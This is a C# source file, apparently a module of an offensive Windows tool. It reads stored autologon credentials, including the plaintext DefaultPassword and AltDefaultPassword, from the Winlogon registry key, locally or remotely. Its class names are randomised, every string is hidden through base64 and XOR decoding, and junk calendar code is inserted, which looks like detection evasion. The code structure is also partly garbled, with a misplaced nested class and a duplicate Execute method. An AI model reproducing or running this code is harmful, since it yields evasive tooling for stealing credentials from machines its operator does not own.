using System.Collections.Generic;
using Microsoft.Win32;
using System;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

namespace O_F41F88FA.Commands.Windows
{
internal class O_E4AC9A55 : O_2183A68D
{
    public override string Command => Encoding.UTF8.GetString(Convert.FromBase64String("1nqOGi33eJP0Z48yLedkvA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("gRPgfkKAC9I=")[iii % 8])).ToArray());
    public override string Description => Encoding.UTF8.GetString(Convert.FromBase64String("udc9rBXVSIPL0y+xCc1VnYTceqwIx1WIhtMurAnP").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("67JaxWahOvo=")[iii % 8])).ToArray());
    public override CommandGroup[] Group => new[]
    {
        CommandGroup.System
    };

    public Runtime ThisRunTime;
    public override bool SupportRemote => true;

    public O_E4AC9A55(Runtime runtime) : base(runtime)
    {
        ThisRunTime = runtime;
    }

    public override IEnumerable<O_4AED570F?> Execute(string[] args)
    {
        var winlogonPath = Encoding.UTF8.GetString(Convert.FromBase64String("/1sKsEZNWn/wWSWHY2N7VcpgELN4YmxV22dsqkVQS0/eZimKZVptSN99I4pNW2FUwHsri38=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("rBRM5BEMCDo=")[iii % 8])).ToArray());
        var strDefaultDomainName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("loprU1MNqqC9gmxbSC+/ibc=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("0u8NMiZh3uQ=")[iii % 8])).ToArray()));
        var strDefaultUserName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("CHRUgneEswE/dECtY4Wi").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TBEy4wLox1Q=")[iii % 8])).ToArray()));
        var strDefaultPassword = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("tiCAXPpHw1iTNpVK4FnT").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("8kXmPY8rtwg=")[iii % 8])).ToArray()));
        var strAltDefaultDomainName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("h10PYqDkAGSqRT9JqOMIf4hQFkM=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("xjF7JsWCYRE=")[iii % 8])).ToArray()));
        var strAltDefaultUserName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("NGEs/T15DfsZeQ3KPW0i7xho").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("dQ1YuVgfbI4=")[iii % 8])).ToArray()));
        var strAltDefaultPassword = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("1waad2DfIlP6Hr5Sdso0SeQO").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("lmruMwW5QyY=")[iii % 8])).ToArray()));
        yield return new O_A84D8E7E(strDefaultDomainName, strDefaultUserName, strDefaultPassword, strAltDefaultDomainName, strAltDefaultUserName, strAltDefaultPassword);
    }

internal class O_A84D8E7E : O_4AED570F
{
    public O_A84D8E7E(string? defaultDomainName, string? defaultUserName, string? defaultPassword, string? altDefaultDomainName, string? altDefaultUserName, string? altDefaultPassword)
    {
        DefaultDomainName = defaultDomainName;
        DefaultUserName = defaultUserName;
        DefaultPassword = defaultPassword;
        AltDefaultDomainName = altDefaultDomainName;
        AltDefaultUserName = altDefaultUserName;
        AltDefaultPassword = altDefaultPassword;
    }

    public string? DefaultDomainName { get; }
    public string? DefaultUserName { get; }
    public string? DefaultPassword { get; }
    public string? AltDefaultDomainName { get; }
    public string? AltDefaultUserName { get; }
    public string? AltDefaultPassword { get; }
}    public IEnumerable<O_4AED570F?> Execute(string[] args, string uUsYYXho)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Globalization.TaiwanLunisolarCalendar instance = new System.Globalization.TaiwanLunisolarCalendar();
                    instance.GetEra(new System.DateTime());
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var winlogonPath = Encoding.UTF8.GetString(Convert.FromBase64String("/1sKsEZNWn/wWSWHY2N7VcpgELN4YmxV22dsqkVQS0/eZimKZVptSN99I4pNW2FUwHsri38=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("rBRM5BEMCDo=")[iii % 8])).ToArray());
        var strDefaultDomainName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("loprU1MNqqC9gmxbSC+/ibc=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("0u8NMiZh3uQ=")[iii % 8])).ToArray()));
        var strDefaultUserName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("CHRUgneEswE/dECtY4Wi").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TBEy4wLox1Q=")[iii % 8])).ToArray()));
        var strDefaultPassword = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("tiCAXPpHw1iTNpVK4FnT").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("8kXmPY8rtwg=")[iii % 8])).ToArray()));
        var strAltDefaultDomainName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("h10PYqDkAGSqRT9JqOMIf4hQFkM=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("xjF7JsWCYRE=")[iii % 8])).ToArray()));
        var strAltDefaultUserName = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("NGEs/T15DfsZeQ3KPW0i7xho").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("dQ1YuVgfbI4=")[iii % 8])).ToArray()));
        var strAltDefaultPassword = ThisRunTime.GetStringValue(RegistryHive.LocalMachine, winlogonPath, Encoding.UTF8.GetString(Convert.FromBase64String("1waad2DfIlP6Hr5Sdso0SeQO").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("lmruMwW5QyY=")[iii % 8])).ToArray()));
        yield return new O_A84D8E7E(strDefaultDomainName, strDefaultUserName, strDefaultPassword, strAltDefaultDomainName, strAltDefaultUserName, strAltDefaultPassword);
    }
}}